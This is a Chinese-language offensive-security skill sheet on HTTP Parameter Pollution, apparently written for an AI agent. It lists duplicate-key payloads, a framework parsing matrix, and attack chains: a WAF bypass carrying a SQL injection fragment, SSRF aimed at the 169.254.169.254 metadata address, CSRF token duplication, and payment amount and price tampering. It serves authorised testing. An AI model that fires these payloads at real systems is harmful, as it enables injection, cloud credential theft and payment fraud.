# 技能：HTTP 参数污染 (HPP)

> **AI 加载指令**：模拟**完整请求路径**：浏览器 → CDN/WAF → 反向代理 → 应用框架 → 业务代码。重复键（`a=1&a=2`）在 HTTP 层级不是错误；每个节点可能选择第一个、最后一个、合并或数组化。当 WAF 和应用不一致，或内部 HTTP 客户端重建查询字符串时测试 HPP。路由说明：当相同参数出现多次，或 WAF/后端堆栈不同时，使用第 1 节矩阵测试先/后/合并假设，然后设计第 3 节场景链。

## 0. 快速入门

**假设**：安全检查读取参数的一个实例，而操作读取另一个实例。

### 第一次尝试的有效载荷

```text
id=1&id=2
id=1&id=1%20OR%201=1
url=https://legit.example&id=https://evil.example
amount=1&amount=9999
csrf=TOKEN_A&csrf=TOKEN_B
user=alice&user=admin
```

### 请求体变体（POST 时重复）

```text
application/x-www-form-urlencoded
id=1&id=2

multipart/form-data
------boundary
Content-Disposition: form-data; name="id"
1
------boundary
Content-Disposition: form-data; name="id"
2
```

### 快速方法

1. 使用基准 `a=1&a=2` 指纹**前端**堆栈（CDN/WAF）与**源端**（语言/框架）。
2. 发送**两种**顺序：`a=1&a=2` 和 `a=2&a=1`（某些解析器对顺序敏感）。
3. 如果是 JSON：测试**重复键**和 Content-Type 混淆（见第 2 节）。

## 1. 服务器行为矩阵

典型默认值 — **始终确认**；中间件和自定义解析器会覆盖这些。

| 技术 | 行为 | 示例：`a=1&a=2` |
|---|---|---|
| PHP / Apache (`$_GET`) | 最后一个实例 | `a=2` |
| ASP.NET / IIS | 通常逗号连接（全部） | `a=1,2` |
| JSP / Tomcat (servlet 参数) | 第一个实例 | `a=1` |
| Python / Django (`QueryDict`) | 最后一个实例 | `a=2` |
| Python / Flask (`request.args`) | 第一个实例 | `a=1` |
| Node.js / Express (`req.query`) | 值数组 | `a=['1','2']`（形状可能因解析器版本而异） |
| Perl / CGI | 第一个实例 | `a=1` |
| Ruby / Rack (Rack::Utils) | 最后一个实例 | `a=2` |
| Go `net/http` (`ParseQuery`) | 第一个实例 | `a=1` |

**为什么这很重要**：IIS 上的 WAF 可能看到 `1,2`，而 PHP 后端只接收 `2` — 或者反之，如果代理标准化了。

## 2. 有效载荷模式

### 2.1 基本重复键

```http
GET /api?q=safe&q=evil HTTP/1.1
```

### 2.2 数组风格（PHP / 某些框架）

```http
GET /api?id[]=1&id[]=2 HTTP/1.1
```

### 2.3 混合数组 + 标量

```http
GET /api?item[]=a&item=b HTTP/1.1
```

### 2.4 编码的 &（解析器差异）

```text
# 字面 & 在值内 vs 新对 — 取决于解码器
param=value1%26other=value2
param=value1&other=value2
```

### 2.5 嵌套 / 方括号键

```http
GET /api?user[name]=a&user[role]=user&user[role]=admin HTTP/1.1
```

### 2.6 JSON 重复键

```json
{"test":"user","test":"admin"}
```

许多解析器保留**最后一个**键；一些保留**第一个**。JavaScript `JSON.parse` 保留最后一个重复键。

## 3. 攻击场景

### 3.1 HPP + WAF 绕过

**模式**：WAF 检查**第一个**值；应用使用**最后一个**。

```text
id=1&id=1%20UNION%20SELECT%20...
```

也尝试：JSON 字段中的良性值在查询字符串中重复，如果网关以不同方式合并源。

### 3.2 HPP + SSRF

**模式**：验证器读取**安全** URL；获取器读取**内部/恶意** URL。

```text
url=https://allowed.cdn.example/&url=http://169.254.169.254/
```

确认哪个组件（库 vs 应用）消费哪个实例。

### 3.3 HPP + CSRF

**模式**：重复 CSRF 令牌，一个副本满足解析器 A，另一个满足解析器 B。

```text
csrf=LEGIT&csrf=IGNORED_OR_ALT
```

仅在**授权**的 CSRF 评估中使用，并具有明确的变更目标。

### 3.4 HPP + 业务逻辑（例如支付）

```text
amount=1&amount=5000
quantity=1&quantity=-1
price=9.99&price=0.01
```

与**竞态条件**或**服务器端舍入**配对以获得更高影响；单独的 HPP 通常需要在层之间进行拆分解释。

## 4. 工具

| 工具 | 如何使用 |
|---|---|
| **Burp Suite** | Repeater：在原始查询/请求体中重复键；Param Miner / 扩展程序用于隐藏参数；比较响应以 `第一个` vs `最后一个` 解释 |
| **OWASP ZAP** | 手动请求编辑器；自动扫描可能不会深度模糊 HPP — 优先手动变体 |
| **自定义脚本** | 构建精确的原始 HTTP（保留顺序）— 某些客户端会规范化重复 |

**提示**：如果控制测试实验室，请在应用处记录**原始**查询字符串；某些框架只暴露“获胜”值，而日志显示完整字符串。

**安全与范围**：HPP 测试可能更改服务器状态（支付、账户设置）。仅在**明确授权**下运行，使用范围账户，并在高影响请求前记录解析器行为。
